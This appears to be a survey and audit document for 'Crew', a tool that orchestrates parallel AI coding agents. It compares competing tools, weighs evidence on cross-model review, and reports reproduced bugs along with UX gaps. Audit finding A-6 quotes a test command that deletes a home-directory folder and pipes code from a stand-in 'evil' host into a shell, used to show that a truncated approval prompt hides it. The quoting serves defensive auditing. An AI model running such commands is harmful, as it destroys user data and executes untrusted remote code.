# 05. Related Work and Takeaways

Surveyed 2026-11-12. Star counts, last push dates, and licenses were checked via `gh api`; code analysis was done by shallow-cloning repositories and reading source files without running them. Community reception comes from Hacker News threads and blog summaries, with little direct evidence from Reddit or X. Vendor-reported numbers are marked "(vendor)", and unverified items are marked "unverified".

## 1. Summary

- **Worktrees plus a dashboard is already commodity infrastructure.** Plenty of human-driven GUIs and TUIs do this, and several have already shut down or stalled (Conductor is shutting down its cloud on Nov 20 after joining Meta; Vibe Kanban is community-maintained after the company wound down). What sets Crew apart is that a lead agent delegates over MCP and reviews/merges diffs, workers are driven through structured protocols, approvals are routed to the user, and Codex performs adversarial cross-review.
- **The closest point of comparison is `openai/codex-plugin-cc`** (35k★, Apache-2.0). It lacks worktree isolation, user approval routing, and a polish role—and its top open issues are almost all process lifecycle bugs. Crew needs to guard against the same class of bugs.
- **Evidence for cross-model code review is weaker than commonly assumed.** For code, existing research suggests a fresh reviewer with a clean context matters more than switching model vendors—whereas for documentation and prose, cross-model review showed a large gain (section 4).
- **The industry broadly warns against parallel writes and over-orchestration.** Both Anthropic and Cognition favor read-heavy fan-out while treating parallel writes as high-risk. Crew's "delegate only separable slices + single lead merges" design matches that consensus.

## 2. Survey by category

### A. Parallel coding-agent orchestrators

| Project | Metrics | Key points |
| --- | --- | --- |
| Conductor (proprietary) | Joined Meta; cloud shutting down 11/20 | 222 pts on HN. Praised for UX; criticized for shutdown timeline and lock-in. Early complaints: did not use local checkout, reinstalled dependencies per workspace, skipped `.env`, needed notifications |
| Vibe Kanban | 28.6k★, Apache-2.0 | Community-maintained after company shut down in 2026-04. Rust. Worktree creation lock, orphan run cleanup on boot, structured approval objects (id, question flag, timeout) |
| cmux | 28.8k★, GPL-3.0+ | Swift/Ghostty. Notification ring praised. CHANGELOG documents subagent status misreporting and session-restore storm bugs |
| Paradev (formerly Superset) | 16.2k★, MIT | Hook-based state detection; PTY daemon keeps sessions alive across app updates. Supports Antigravity via hooks |
| Claude Squad | 8.8k★, AGPL-3.0 | Detects state by hashing tmux panes; daemon forces AutoYes. Last push in August |
| Emdash | 6.2k★, Apache-2.0 | Best-documented ACP runtime and ADRs. Slows down around ~78 tasks |
| Agent of Empires | 4.1k★, MIT | State enum, hook status files, idle auto-stop, one-time approval nonces |
| CCManager | 1.3k★, MIT | Per-agent regex state detection; blocklist of dangerous commands followed by an LLM auto-approval gate |

Their state reading, deletion ordering, and approval models informed the candidates in section 5.

### B. Claude Code harnesses

| Project | Metrics | Key points |
| --- | --- | --- |
| `openai/codex-plugin-cc` | 35.1k★, Apache-2.0, last push July, 545 open issues | `/codex:review`, `:adversarial-review`, `:rescue`. Stop-hook review gate (README warns about token burn) |
| `oh-my-claudecode` | 40.8k★, MIT, 189 contributors | 19 agents, ~85 skills. `team-plan → prd → exec → verify → fix` pipeline. Very large surface area |
| Gas Town / Beads | 18.8k★ / 28.7k★ | Multi-tier hierarchy (Mayor, Polecat, Witness, etc.). High cost; the creator advises most people not to use it. Completion-signaling rules are well thought out |
| PAL MCP (`zen`) | 11.8k★, last push 2025-12 | Model-API multi-model tool, effectively dormant. `clink` (CLI bridge) is the one surviving idea |
| `wshobson/agents` | 42.4k★, MIT | 92 plugins. Three-tier progressive skill disclosure and `evals` directory |
| `github/spec-kit` | 149k★, MIT | Spec-first workflow; `NEEDS CLARIFICATION` markers block implementation |
| Claude Code Agent Teams | Official, experimental | Shared task list, teammate messaging, `TeammateIdle`/`TaskCompleted` hooks. Docs note a known issue where the lead implements tasks itself instead of waiting |

We also looked at `claude-flow` / `ruflo` (81k★) solely as a cautionary tale due to controversy over hype vs. substance (checked metadata only).

### C. General frameworks and protocols

- **OpenHands** (93k★): Evolved into a self-hosted control plane called Agent Canvas that attaches ACP agents. Its SDK ACP client (`acp_agent.py`) is a strong practical reference, though it auto-approves ACP agent permissions (the opposite of Crew).
- **ACP** (v1 stable, v2 draft): Permission requests use `session/request_permission`; cancellation sends a `session/cancel` notification followed by a `stopReason: cancelled` response. The v2 draft defines `running / requires_action / idle` states.
- **MCP** (2026-07-28 spec): Moves toward statelessness, shifts Tasks into an extension, and makes `input_required` a first-class state.
- **LangGraph** (44.8k★): Stable IDs for `interrupt()`, response schema validation, and preserving writes from completed steps when a later step fails.
- **OpenAI Agents SDK**: `needs_approval`, serializable `RunState`, and rejection reason forwarding. Docs warn that "always allow" is keyed by tool name and can leak across agents.
- **Claude Agent SDK**: Control protocol and `session_state_changed`. Code comments note a subtlety: "`result` marks the end of a turn, not the end of execution."
- **A2A** (v1.0.1) and **Google ADK**: Useful mainly as references for state names (`REJECTED`, `AUTH_REQUIRED`) and at-least-once resume semantics.

CrewAI, Mastra, and Microsoft Agent Framework were skipped as too far removed from supervising CLI coding agents (inferred).

### D. Commercial products and industry research

- **Cognition**: Shifted from "Don't Build Multi-Agents" (2025-06) to "What's Actually Working" (2026-04). Endorses generator-verifier loops while viewing unstructured swarms as "mostly getting in the way." Claims a reviewer with a clean context beats a noisy one (vendor claim).
- **Anthropic multi-agent research**: 90.2% improvement over a single agent on internal evaluations at roughly 15x token cost, while noting that coding tasks are less parallelizable than research.
- **Anthropic long-running harness**: Uses a separate skeptical evaluator and "sprint contracts" (agreed completion criteria up front), costing \$200 with the harness vs. \$9 solo. Recommends re-auditing harness stages whenever a new model ships.
- **Cursor**: Up to 8 parallel agents in worktrees or remote VMs. User complaints center on worktree detection failures, token waste, and repetitive approvals; blog posts converge on 3–5 agents as the practical sweet spot.
- **GitHub Agent HQ**: Assigns Copilot, Claude, and Codex to the same issue for comparison. Main complaints are review fatigue and low-quality PRs.
- **Codex subagents**: Fail if an approval cannot be surfaced, propagating the error to the parent.
- **Factory Missions** (single vendor demo): Verifiers only report and never edit; verification takes ~37% of time and ~1/3 of tokens.
- **Amp Oracle**: Read-only second opinion from another vendor's model.

## 3. What Crew already does well

- Dedicated worktree and branch per job; the bridge commits and only the lead merges.
- Worker approvals and questions are routed to the user with no auto-approval—unlike `codex-plugin-cc`, OpenHands, or Claude Squad.
- Uses structured protocols (`codex app-server`, `agy acp`) rather than terminal screen-scraping.
- Fixed roles (implementation, adversarial review, copy polish) with out-of-scope edits rejected.
- Background execution plus `wait` avoids long synchronous tool-call timeouts.
- Small surface area (2 workers, a couple of skills, static board) without the over-orchestration of OMC or Gas Town.

## 4. A candid look at the evidence for cross-model review

- Song, arXiv:2610.01471 (single author, preprint, based on seeded errors in Korean artifacts): For code, a fresh-session same-model reviewer (F1 40.7%) was not significantly different from a cross-model reviewer (37.2%). For documentation, cross-model review led by a wide margin (42.1% vs. 24.5%). Because the two caught partially non-overlapping errors, pairing 1 same-model + 1 cross-model reviewer reached 56.7%, beating 2 same-model reviewers (42.7%). A third reviewer added little, and a weak cross-model reviewer did not help.
- Other work reports that errors remain correlated across high-accuracy models even from different vendors (checked abstract summary only).
- Blog posts praising Codex reviews of Claude code contain no measurements, and say so themselves.

Takeaway: Crew's combination of `crew:self-reviewer` (fresh context) + Codex review matches the evidence. The right justification is "a clean context, a sufficiently strong second reviewer, and partially non-overlapping blind spots" rather than "a different vendor." The strong cross-model gain on documentation and prose also supports the Antigravity polish stage. Adding a third review stage is not worth it.

## 5. Candidates to adopt (suggested priority)

Each item below comes from the surveyed projects; section 8 checks them against Crew's actual codebase.

**High priority: process and state hygiene (the #1 source of real-world user failures)**
1. On daemon startup, mark jobs recorded as `running` with no live worker process as `failed` and surface them (Vibe Kanban, Emdash, AoE).
2. Reap `codex app-server` and `agy acp` child processes when sessions end; key state by session/repository rather than cwd hash (`codex-plugin-cc` orphan-process issues).
3. Serialize worktree creation and removal with a per-repository mutex and persist deletion intent so cleanup is idempotent across restarts; never delete paths outside Crew's dedicated root, and treat a directory as a worktree only when `.git` is a file (Emdash ADR 0006, Vibe Kanban).
4. Model approvals and questions as structured objects: ID, options, timeout, question vs. permission flag, and single-use response token; do not consume malformed answers so the user can retry. Forwarding denial reasons requires a separate follow-up message because neither Codex nor ACP includes a reason field in the permission response (Vibe Kanban, LangGraph, OpenAI Agents SDK, AoE).
5. Cancellation flow: after `session/cancel`, answer pending permission requests with `cancelled`, mark open tool calls cancelled, and treat `stopReason: cancelled` as normal rather than an error; restart the session if it fails to stop after a grace period (ACP spec, OpenHands).
6. Call `resume/load/close` only when negotiated in capabilities, ignore unknown update kinds, never treat unknown permission outcomes as approval, and ignore non-JSON lines on stdout (ACP, OpenHands).
7. State detection: reset the idle timer on any `session_update`, use a separate startup timeout, and debounce briefly. A turn result is not necessarily the end of a job; do not wake the lead while background work remains active (OpenHands, Superset, Claude Agent SDK, cmux bugs).
8. Distinguish "definitely not sent" from "delivery uncertain" when dispatching prompts, and never auto-retry uncertain deliveries (Emdash).

**Medium priority: review and prompt quality**
9. Codex review prompt structure: role ("try to falsify confidence"), finding bar, evidence rules, calibration rules, and structured output (file, line range, confidence)—plus "if there are no defensible findings, say so" (`codex-plugin-cc` `adversarial-review.md`).
10. Add a pre-prediction → missing-change check → open-questions separation to reviewer prompts; require fresh command output for approval and never let an agent approve artifacts from its own context (`oh-my-claudecode` `critic.md`, `verifier.md`).
11. Include explicit acceptance criteria ("sprint contract") in delegation prompts and have the reviewer grade against them, running tests and checks rather than only reading the diff (Anthropic harness article).
12. Compare test baselines against post-change failures with deterministic tooling rather than model eyeballing, and forbid rewriting the baseline to make tests pass (OMC `ralph`).
13. Cap fix loops (e.g., max N rounds) and escalate to the user when exceeded (Devin loops, Factory's 4-round cap, `codex-plugin-cc` Stop-gate token warnings).
14. Include explicit worker rules: "report plainly if there is nothing to implement" and "edits outside the worktree will be discarded" (Gas Town).
15. Add a single instruction telling the lead to evaluate review findings critically rather than blindly accepting or rejecting them (PAL `challenge`), balanced against the rule prohibiting automatic application of review suggestions.

**Low priority / optional**
16. A fast path that skips the crew for small tasks (effort sizing) and per-job token display, given ~15x multi-agent token overhead (Anthropic).
17. Show the spec, diff summary, test results, and out-of-scope files for each merge candidate on the board; cap or queue concurrent jobs at 3–5.
18. Two-stage job deletion (trash → permanent delete) and rate-limiting bulk worker restarts (AoE, cmux restore storms).
19. Progressive skill disclosure (short `SKILL.md` with role details in `references/`) and a few replayable scenario tests for `/crew:run` (`wshobson/agents`, `ccpm`).
20. Re-audit pipeline stages whenever underlying models upgrade and drop stages that no longer add value (Anthropic).
21. Keep board card order stable across activity events, and show subagents and background tasks as running until they finish (cmux).
22. Optional Antigravity hooks for state detection: Superset uses `PreInvocation`/`Stop` in `~/.gemini/config/hooks.json` and intentionally omits `PreToolUse` because missing decision output blocks the tool. Since Crew uses ACP, hooks are unnecessary except as a fallback.

## 6. What we will not copy

- Terminal screen-scraping and AutoYes (Claude Squad), LLM auto-approval gates (CCManager), or auto-approving ACP agent permissions (OpenHands).
- Stop-hook review gates that run on every turn (token burn and runaway loops).
- Dozens of agents and watcher hierarchies (Gas Town), 19 agents and 85 skills (OMC), or large persona catalogs (`wshobson/agents`).
- Graph DSLs, handoff-as-tool patterns, A2A agent cards, or MCP OAuth / stateless transport machinery.
- Single-vendor cloud lock-in and closed distribution (the fate of Conductor and Vibe Kanban), or heavy Electron wrappers.
- ACP `fs/*` and `terminal/*` client methods that grant workers direct host access.

## 7. Limitations of this survey

- ACP v2 is a fast-moving draft that changes almost weekly; targeting v1 semantics and gating on advertised capabilities is safer. Whether Codex and Antigravity match every detail above was not verified across all edge cases.
- The cross-model review numbers come from a single preprint; Cognition, Devin, and Factory numbers come from vendor materials.
- Direct Reddit and X threads were largely unavailable, so community sentiment relies on HN and blog posts.
- Several commercial-tool comparison blogs are affiliate-driven and weak evidence.
- Section 8 compares the candidates from section 5 against Crew's codebase. The issue candidates in sections 8.A and 8.B were reproduced with a fake `codex app-server` and temporary repositories; whether live Codex triggers every condition was not verified in all cases (noted per item).

## 8. Comparison of candidates against Crew's code

Checked against `plugin/bridge/`, `plugin/roles/`, and `plugin/skills/run/SKILL.md` on 2026-11-12. Status is rated **Implemented / Partial / None**.

| # | Candidate | Status | Evidence and remaining work |
| --- | --- | --- | --- |
| 1 | Startup orphan job cleanup | Implemented | `load()` in `jobs.ts` marks unfinished jobs `failed` and instructs the user to resume via `reply`. Remaining: no sweep for orphaned worktrees/branches that lack a job record (see A-2 below). |
| 2 | Child process reaping | Mostly implemented | The single daemon spawns at most one `codex app-server` and one `agy acp`, stops them after 10 minutes idle, and calls `peer.close()` in `shutdown()`. Whether children survive if the daemon receives `SIGKILL` was not verified. |
| 3 | Worktree serialization, retry, safe deletion | None (need unconfirmed) | `createWorktree` has no mutex or retry; concurrent creation collisions were not reproduced. Confirmed via reproduction that `discard` succeeds even after the worktree directory is deleted manually (`--force` handles it). |
| 4 | Structured approval objects | Partial | Has `waiting{type,reason}`, `seq` keys, both board and app responses, and duplicate-answer protection. However, multiple requests on a single job overwrite `run.pending` (A-1), and pending requests have no timeout (A-5). Forwarding denial reasons is unsupported by the underlying protocols (B-1). |
| 5 | Cancellation flow | Partial | Codex sends `turn/interrupt` and maps `interrupted` to `cancelled`; Antigravity maps `stopReason: cancelled`. There is no grace-period wait + session restart. Because individual tool-call states are not stored, closing open tool calls does not apply. |
| 6 | Capability checks & noise tolerance | Partial | `rpc.ts` ignores non-JSON lines (implemented). Antigravity calls `session/resume` directly without checking capabilities in the `initialize` response. |
| 7 | State detection | Partial | Any notification resets the timer via `activity()`, and Codex subagent activity counts toward the parent job (implemented). `RpcPeer.request` has no timeout, so if `initialize` hangs, the job only turns `stalled` in `starting` and never fails (A-4). |
| 8 | Uncertain prompt delivery | N/A | Retries are decided explicitly by the lead via `reply`; there is no automatic retry. |
| 9 | Adversarial review prompt | Partial | `codex-reviewer.md` has verdict, severity, `path:line`, and `Not verified`, plus a single line to say so if nothing is found. Confidence scores, explicit anti-hallucination rules for file/line refs, and calibration rules ("one strong finding beats several weak ones") are absent. |
| 10 | Pre-prediction & missing-change analysis | None | Absent from both reviewer prompts. |
| 11 | Acceptance criteria | Partial | `delegate` accepts `done_when`, whereas `review` only accepts `focus` and does not receive the intended behavior separately. |
| 12 | Test baseline diffing | None | Final verification relies on the lead running tests. |
| 13 | Fix loop cap | Implemented (docs) | `SKILL.md` caps reviews at two rounds, though code does not enforce it. |
| 14 | Worker exit & path rules | Implemented | Engineer role instructs workers to report if a task cannot be done, prompts restrict edits to the worktree, and edits outside it are caught in `outOfScope` via `touched` tracking (stronger than a prompt rule alone). |
| 15 | Critical evaluation of review findings | Implemented | Step 5 of `SKILL.md`: fix what you agree with and tell the user what you decline and why. |
| 16 | Skip crew on small tasks; usage display | Partial | Skipping is allowed by `SKILL.md`. Codex tokens are collected in `job.tokens` but not shown on the board or in `describe`; only rate-limit window percentages appear. |
| 17 | Merge candidate summary & concurrency cap | Partial | `describe` outputs diffs and merge commands for the lead, but the board shows only changed-file and out-of-scope counts. No concurrency cap. |
| 18 | Trash-style deletion | None | `discard` immediately runs `worktree remove --force` and `branch -D`. |
| 19 | Rate-limiting bulk restarts | N/A | The daemon never auto-restarts jobs. |
| 20 | Progressive skill disclosure & evals | N/A | `/crew:run` is 66 lines and does not need splitting yet. Unit tests cover `jobs`, `claude`, and `policy`. |
| 21 | Board order stability | Partial | Cards update in place by key and preserve timers, but the Claude lane sorts by `activeAt`, reordering cards on every tool call (B-2). |
| 22 | Antigravity hooks | Optional | ACP is sufficient; hooks are not needed. |

### A. Issue candidates from the code audit and reproduction results

Reproduced using a fake `codex app-server` (JSON-RPC stub), temporary git repositories, and a daemon running on an isolated `CREW_HOME` and port. Reproduction scripts lived in an external scratchpad without modifying Crew source or touching the user's live `~/.crew` daemon and jobs.

| Candidate | Result | What happened |
| --- | --- | --- |
| A-1 Subagent approvals silently declined | **Reproduced** (conditional) | An approval request from a subagent thread (with `parentThreadId` set) was immediately answered with `decline` without changing job status or notifying the user. Whether live Codex sends approval requests under the child `threadId` was not verified, though the protocol schema includes `threadId` on approval requests and documents `Thread.parentThreadId` as set for subagents. |
| A-1b Overlapping approval requests | **Reproduced** | When two requests arrived back to back on the same thread, the user saw only the second (`echo second`), and approving once sent only one response back to Codex, leaving the first request unanswered forever. Whether live Codex emits two concurrent approvals on one thread was not verified. |
| A-2 Worktree and branch leak | **Reproduced** | Creating 201 jobs left 201 worktrees and 201 `crew-*` branches on disk while `jobs.json` kept only 200 records. After a restart, calling `discard` on the oldest job failed with `No job with id ...`, leaving its worktree and branch orphaned on disk. |
| A-3 Stuck `discard` after manual deletion | **Refuted** | Deleting the worktree directory manually and then calling `discard` succeeded on the first try. Removed from the issue list. |
| A-4 Infinite hang during startup | **Reproduced** | Against a server that never answered `initialize`, the job remained `running` / `starting` past 35 seconds, emitting only a single `stalled` event without failing or surfacing the cause. |
| A-5 Stall timer while waiting for input | **Reproduced, low severity** | A job left waiting for approval for 40 seconds (`stallSeconds=1`) did not turn `stalled`. This is reasonable since it is waiting on the human, though only a single initial notification is sent with no elapsed-wait indicator. |
| A-6 Truncated approval command text | **Reproduced** | A 3-line command (`cd /tmp && echo safe` / `rm -rf $HOME/important` / `curl http://evil | sh`) displayed only the first line (`run: cd /tmp && echo safe`) in the approval prompt, hiding the destructive lines from the user. Whether live Codex formats multiline commands this way was not verified. |

The highest-risk findings are A-6 (safety) and A-1 (silent denial), followed by A-2 (disk leak).

### B. Improvement candidates from the code audit

| Candidate | Result | Details |
| --- | --- | --- |
| B-1 Forwarding denial reasons | **Refuted** | In the Codex approval response schema, `decision` is an enum (`accept`, `acceptForSession`, `decline`, `cancel`, etc.) with no reason field, and ACP's permission response has none either. Sending a reason requires a separate follow-up message (such as `turn/steer`) after declining; it cannot be carried inside the approval response itself. |
| B-2 Claude lane card reordering | **Reproduced** | On the live browser board, three sessions ordered `C > B > A` reordered to `A > C > B` after one tool call in A, and then to `B > A > C` after one tool call in B. Cards keep jumping while agents work. |

### C. Follow-up verification and fixes

The tables above describe the initial audit. The follow-up used temporary Git repositories, JSON-RPC stubs, the installed Codex protocol schema, and an Antigravity v1.5.5 initialization handshake.

| Finding | Follow-up |
| --- | --- |
| A-1, A-1b, A-6 | Child-thread requests reach the parent job, including on later turns. Each job presents requests in arrival order. Every answer requires the request ID, which stays unique across daemon restarts. Approval text includes the entire command, the working directory if supplied, and any requested additional permissions. Actual Codex approval traffic was simulated. |
| A-2 | The 200-record limit applies to delivered, finished history without worktrees. Active jobs, unread results, and records that own worktrees survive restarts. Worktrees already orphaned by the old limit require separate recovery. |
| A-3 | Deleting the directory alone was already recoverable. A separate failure was reproduced by locking the branch ref after worktree creation. Discard now retries after partial removal and checks the registered path and branch before deleting. |
| A-4 | Worker initialization and session setup have a 30-second RPC deadline. A failed handshake closes the worker process. A lost turn-start acknowledgement leaves the job active because the prompt may have reached the worker. |
| A-5 | Human input can remain pending indefinitely. The board displays the elapsed wait time. |
| B-1 | The installed Codex schema and ACP permission response offer no field for a denial reason. |
| B-2 | Claude cards keep their position within each status group when tool activity updates the timestamp. |

Antigravity restores sessions using advertised ACP capabilities. Cancellation blocks new permissions and waits for the worker to stop, with a negotiated ACP session close as a fallback. The review prompt accepts explicit acceptance criteria and asks for evidence from checks. The board and job details show recorded Codex tokens.

The optional proposals for a job cap, trash, hooks, and additional board views remain open. Repository-wide worktree locking, abrupt daemon termination, and parent turns that finish while child turns are still active need separate evidence.

## 9. Usability and UX takeaways

Comparing Crew's board (`plugin/board/`) and workflow against the surveyed tools highlights both existing strengths and high-leverage gaps.

### What already works well

- Shows status with a single-word badge and color (`Needs approval` / `May be stuck` / `Done`), floats waiting and stalled cards to the top, and dims finished cards.
- Calibrates against server time so timers stay accurate even with clock skew, and displays `Disconnected — reconnecting…` on connection drop.
- Allows answering approvals from either the in-app prompt or the board, invalidating whichever was not used first, and never lets the lead decide on the user's behalf when a prompt is dismissed.
- Offers `Copy resume command` so the user can pick up any worker session directly in its native CLI—clearer than almost any surveyed tool.
- Gives the lead ordered review, accept, revise, and cleanup commands in `describe` output.
- Solves Conductor's top early complaint (missing `.env` and dependencies) via `.worktreeinclude`, and stays fast on APFS via copy-on-write clones.
- Fires notifications only on waiting, error, limit, and stall events—keeping completion silent by default to avoid notification fatigue.

### High-impact UX gaps (ordered by impact)

1. **Clicking a card opens nothing.** Nearly every surveyed tool centers on a view that helps the user decide whether to merge (Cursor's unified diff, Antigravity's Artifacts, Agent HQ's PR view). Review—not code generation—is the universal bottleneck. Clicking a card should open the worker report (`job.report`), changed files, out-of-scope files, that job's event stream, and notes. All of this data is already served by `/api/jobs/:id`.
2. **Questions cannot be answered in free text on the board.** Question-type waits show only Yes/No buttons on the board even though the in-app prompt accepts free text. Adding a text input on the board makes both surfaces consistent. Because denial reasons cannot be embedded in approval responses (B-1), any reason can be sent as a follow-up message after declining.
3. **The activity feed does not identify which job an event belongs to.** Feed lines only show the agent name, making two concurrent Codex jobs indistinguishable. Prefix each line with the job ID or short title, and filter the feed to a job when its card is clicked.
4. **Notifications do not navigate to the board.** Clicking a macOS notification does nothing. When an approval is waiting, clicking the notification should open the board or app (waiting notifications were the #1 early feature request for Conductor). Prefixing the browser tab title with the pending count—e.g., `(2) Crew`—is a one-line win. Non-macOS platforms currently have no notifications.
5. **Projects are mixed together.** Because a single daemon serves all sessions, jobs from different repositories pile into the same lanes, distinguished only by a small path label. Once more than one project is active, a project filter or grouping is needed; losing track as task count grows was a common complaint across parallel-agent tools (Emdash slows down around ~78 tasks).
6. **Merge candidate summaries are too thin.** Completed cards show only `1 file changed…` and `N out of scope`. Surveyed best practices consistently recommend showing the spec, diff summary, test results, and out-of-scope files in one place—starting simply by surfacing the `Verification` section of the worker's report.
7. **Little cost visibility.** Codex rate-limit window percentages are shown, but per-job token counts (`job.tokens`) were not surfaced initially. Since heavy token consumption is the most consistent warning around multi-agent setups, showing tokens on completed cards helps calibrate usage. Antigravity does not report token counts.
8. **Approval context.** Directly related to A-6: approval prompts should show the full command (collapsible if long), the working directory, and the job's role (including whether it is supposed to be read-only).
9. **No user confirmation checkpoint in `/crew:run`.** The planning stage flows straight into delegation without pausing for confirmation—carrying the same risk noted for Jules, where auto-approved plans weakened review signal. For large tasks only, offering a short one-paragraph plan + delegation breakdown for confirmation avoids wasted runs without adding friction to small tasks.
10. **First-run onboarding.** Only the README mentions that Claude Code must be restarted after installation. Adding a one-line reminder at the end of `crew install` and in `crew doctor` closes that gap. The board's empty state copy is already friendly.
11. **Accessibility and remote access.** Newly waiting cards are not announced to screen readers (missing `aria-live`). Remote/mobile access (as in Agent of Empires or Emdash) conflicts with Crew's local-only design and should remain out of scope.

### UX conclusion

Crew's status display and approval routing are cleaner than most of the surveyed tools. Its weak spot is the screen where the user reads what happened and decides whether to merge. Because the universal bottleneck in parallel-agent tools is review rather than code generation, expanding the board from passive status display into decision support (card detail drawer, per-job feed, free-text question answers, and merge candidate summaries) will deliver the largest payoff.
